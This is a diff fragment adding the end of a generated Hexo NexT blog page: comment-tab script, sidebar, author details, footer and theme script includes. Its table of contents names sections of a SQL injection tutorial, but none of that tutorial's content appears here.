+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.</span> <span class="nav-text">判断注入类型</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.</span> <span class="nav-text">布尔盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%A5%E9%94%99"><span class="nav-number">2.1.</span> <span class="nav-text">绕过报错</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#BurpSuite%E7%88%86%E7%A0%B4"><span class="nav-number">2.2.</span> <span class="nav-text">BurpSuite爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E8%84%9A%E6%9C%AC"><span class="nav-number">2.3.</span> <span class="nav-text">简单脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%8C%E5%88%86%E6%B3%95%E8%84%9A%E6%9C%AC"><span class="nav-number">2.4.</span> <span class="nav-text">二分法脚本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">延时注入</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="zoey"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">zoey</p>
+  <div class="site-description" itemprop="description">Hello!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      博客链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.yoyo2tong.xyz/" title="http:&#x2F;&#x2F;www.yoyo2tong.xyz&#x2F;">myblog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zoey</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">76k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">1:09</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
